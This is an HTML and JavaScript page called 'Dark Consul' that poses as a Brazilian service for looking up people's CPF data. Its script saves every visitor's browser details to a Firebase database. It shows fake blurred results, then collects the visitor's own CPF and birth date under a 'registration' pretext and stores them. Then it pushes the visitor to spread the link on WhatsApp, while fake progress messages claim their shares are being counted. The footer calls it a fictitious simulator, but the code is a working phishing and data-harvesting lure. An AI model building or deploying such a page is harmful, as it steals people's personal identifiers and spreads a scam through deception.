<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Dark Consul</title>

<style>

*{
    margin:0;
    padding:0;
    box-sizing:border-box;
    font-family:Arial, Helvetica, sans-serif;
}

body{
    background:#000000;
    color:#ffffff;
    overflow-x:hidden;
}

.container{
    width:100%;
    min-height:100vh;
    display:flex;
    justify-content:center;
    align-items:center;
    padding:20px;
}

.card{
    width:100%;
    max-width:500px;
    background:#050505;
    border:1px solid #111111;
    border-radius:24px;
    padding:28px;
    box-shadow:0 0 30px rgba(255,255,255,0.03);
}

.logo{
    text-align:center;
    font-size:38px;
    font-weight:bold;
    margin-bottom:15px;
    color:#ffffff;
}

.desc{
    text-align:center;
    color:#bdbdbd;
    line-height:25px;
    font-size:14px;
    margin-bottom:25px;
}

.stats{
    background:#0a0a0a;
    border:1px solid #151515;
    border-radius:18px;
    padding:18px;
    margin-bottom:20px;
}

.stats h3{
    color:#ffffff;
    margin-bottom:12px;
}

.stats p{
    color:#bdbdbd;
    line-height:25px;
    font-size:14px;
}

.service{
    background:#0a0a0a;
    border:1px solid #151515;
    border-radius:18px;
    padding:18px;
    cursor:pointer;
    transition:0.3s;
}

.service:hover{
    border-color:#2a2a2a;
}

.service h3{
    color:#ffffff;
    margin-bottom:14px;
}

.service p{
    color:#bdbdbd;
    line-height:26px;
    font-size:14px;
}

.result{
    margin-top:25px;
    background:#0a0a0a;
    border:1px solid #151515;
    border-radius:18px;
    padding:18px;
    display:none;
}

.result h2{
    text-align:center;
    color:#ffffff;
    margin-bottom:20px;
}

.item{
    background:#111111;
    border:1px solid #1a1a1a;
    border-radius:12px;
    padding:14px;
    margin-bottom:12px;
}

.item span{
    color:#8f8f8f;
    display:block;
    margin-bottom:5px;
    font-size:13px;
}

.item strong{
    color:#ffffff;
}

.censurado{
    filter:blur(5px);
    user-select:none;
}

.bloqueio{
    background:#0a0a0a;
    border:1px solid #151515;
    border-radius:18px;
    padding:18px;
    margin-top:20px;
}

.bloqueio h3{
    color:#ffffff;
    margin-bottom:12px;
    text-align:center;
}

.bloqueio p{
    color:#bdbdbd;
    line-height:24px;
    font-size:14px;
    margin-bottom:15px;
}

.input{
    width:100%;
    height:55px;
    border:none;
    outline:none;
    border-radius:14px;
    background:#111111;
    border:1px solid #1f1f1f;
    color:white;
    padding:15px;
    margin-bottom:14px;
    font-size:15px;
}

.input::placeholder{
    color:#666666;
}

.btn{
    width:100%;
    height:55px;
    border:none;
    border-radius:14px;
    background:#ffffff;
    color:#000000;
    font-size:15px;
    font-weight:bold;
    cursor:pointer;
    margin-top:15px;
    transition:0.3s;
}

.btn:hover{
    opacity:0.85;
}

.loadingBox{
    margin-top:18px;
    display:none;
}

.loadingItem{
    background:#111111;
    border-radius:12px;
    padding:14px;
    margin-bottom:10px;
    color:#ffffff;
    border-left:4px solid #ffffff;
}

.progress{
    width:100%;
    height:12px;
    background:#111111;
    border-radius:20px;
    overflow:hidden;
    margin-top:15px;
}

.progress-bar{
    width:0%;
    height:100%;
    background:#ffffff;
    transition:0.5s;
}

.footer{
    text-align:center;
    color:#5c5c5c;
    margin-top:22px;
    font-size:12px;
    line-height:22px;
}

</style>
</head>

<body>

<div class="container">

<div class="card">

<div class="logo">
Dark Consul
</div>

<div class="desc">
Favor, selecione o tipo de serviço que deseja gerar informações:
</div>

<div class="stats">

<h3>Limites diários</h3>

<p>
📄 Consultas restantes: <span id="consultasRestantes">100</span>/100<br>
📲 Compartilhamentos restantes: <span id="shareRestantes">5</span>/5
</p>

</div>

<div class="service" onclick="gerarConsulta()">

<h3>CPF TITULAR COMPLETO</h3>

<p>
- CPF<br>
- RG<br>
- Emissão<br>
- Data nascimento<br>
- Estado<br>
- Cidade
</p>

</div>

<div class="result" id="resultado"></div>

<div class="footer">
Sistema fictício simulador visual para testes.
</div>

</div>

</div>

<script type="module">

import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";

import {
    getFirestore,
    collection,
    addDoc
} from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";


// FIREBASE CONFIG
const firebaseConfig = {

    apiKey: "SUA_API_KEY",
    authDomain: "SEU_DOMINIO.firebaseapp.com",
    projectId: "SEU_PROJECT_ID",
    storageBucket: "SEU_BUCKET.appspot.com",
    messagingSenderId: "000000000",
    appId: "SEU_APP_ID"

};


// FIREBASE
const app = initializeApp(firebaseConfig);

const db = getFirestore(app);


// SALVAR VISITANTE
async function salvarVisitante(){

    try{

        await addDoc(collection(db, "visitantes"), {

            data: new Date().toISOString(),
            navegador: navigator.userAgent

        });

    }catch(error){

        console.log(error);

    }

}

salvarVisitante();


// LIMITES
let consultas = 100;

let compartilhamentos = 5;

document.getElementById("consultasRestantes").innerText = consultas;

document.getElementById("shareRestantes").innerText = compartilhamentos;


// GERAR CONSULTA
window.gerarConsulta = function(){

    if(consultas <= 0){

        alert("Você atingiu o limite diário!");

        return;

    }

    consultas--;

    document.getElementById("consultasRestantes").innerText = consultas;

    const html = `

    <h2>CPF TITULAR</h2>

    <div class="item">
        <span>CPF</span>
        <strong class="censurado">000.000.000-00 🔒</strong>
    </div>

    <div class="item">
        <span>RG</span>
        <strong class="censurado">00.000.000-0 🔒</strong>
    </div>

    <div class="item">
        <span>Emissão</span>
        <strong class="censurado">SSP 🔒</strong>
    </div>

    <div class="item">
        <span>Data nascimento</span>
        <strong class="censurado">00/00/0000 🔒</strong>
    </div>

    <div class="item">
        <span>Estado</span>
        <strong class="censurado">São Paulo 🔒</strong>
    </div>

    <div class="item">
        <span>Cidade</span>
        <strong class="censurado">Campinas 🔒</strong>
    </div>

    <div class="bloqueio">

        <h3>🔒 Consulta bloqueada</h3>

        <p>
        É necessário se cadastrar para ter acesso aos dados gerados.<br><br>

        Complete o seu cadastro primeiro.<br><br>

        Os dados informados são utilizados para segurança da plataforma, prevenção contra spam e abusos internos.
        </p>

        <input
            type="text"
            id="cpfInput"
            class="input"
            maxlength="14"
            placeholder="CPF: 999.999.999-99"
        >

        <input
            type="date"
            id="nascimentoInput"
            class="input"
        >

        <button class="btn" onclick="validarCadastro()">
            Finalizar Cadastro
        </button>

        <div class="loadingBox" id="loadingBox">

            <div class="loadingItem" id="statusText">
                Iniciando compartilhamento...
            </div>

            <div class="progress">
                <div class="progress-bar" id="progressBar"></div>
            </div>

        </div>

    </div>

    `;

    document.getElementById("resultado").innerHTML = html;

    document.getElementById("resultado").style.display = "block";

}


// FORMATAR CPF
document.addEventListener("input", function(e){

    if(e.target.id === "cpfInput"){

        let value = e.target.value.replace(/\D/g,'');

        value = value.replace(/(\d{3})(\d)/,'$1.$2');

        value = value.replace(/(\d{3})(\d)/,'$1.$2');

        value = value.replace(/(\d{3})(\d{1,2})$/,'$1-$2');

        e.target.value = value;

    }

});


// VALIDAR CADASTRO
window.validarCadastro = async function(){

    const cpf = document.getElementById("cpfInput").value;

    const nascimento = document.getElementById("nascimentoInput").value;

    if(cpf.length < 14){

        alert("Informe um CPF válido!");

        return;

    }

    if(!nascimento){

        alert("Informe sua data de nascimento!");

        return;

    }

    try{

        await addDoc(collection(db, "cadastros"), {

            cpf: cpf,
            nascimento: nascimento,
            navegador: navigator.userAgent,
            data: new Date().toISOString()

        });

    }catch(error){

        console.log(error);

    }

    iniciarCompartilhamento();

}


// COMPARTILHAMENTO
window.iniciarCompartilhamento = function(){

    if(compartilhamentos <= 0){

        alert("Limite diário de compartilhamentos atingido!");

        return;

    }

    compartilhamentos--;

    document.getElementById("shareRestantes").innerText = compartilhamentos;

    const texto = encodeURIComponent(
        "Acesse agora Dark Consul 🔥"
    );

    window.open(
        "https://wa.me/?text=" + texto,
        "_blank"
    );

    const loadingBox = document.getElementById("loadingBox");

    const statusText = document.getElementById("statusText");

    const progressBar = document.getElementById("progressBar");

    loadingBox.style.display = "block";

    let etapas = [

        "1/1 - necessário compartilhar com mais amigos para desbloquear...",
        "2/2 - verificando compartilhamentos...",
        "3/3 - total compartilhados 3 contatos...",
        "4/4 - quase lá restam apenas 2 contatos...",
        "5/5 - compartilhe com 1+ amigo e libere sua consulta"

    ];

    let porcentagens = [

        "20%",
        "40%",
        "60%",
        "80%",
        "100%"

    ];

    let i = 0;

    const intervalo = setInterval(()=>{

        statusText.innerHTML = etapas[i];

        progressBar.style.width = porcentagens[i];

        i++;

        if(i >= etapas.length){

            clearInterval(intervalo);

            setTimeout(()=>{

                statusText.innerHTML = "✅ Compartilhamentos verificados com sucesso!";

                progressBar.style.width = "100%";

            },1000);

        }

    },2000);

}

</script>

</body>
    </html>
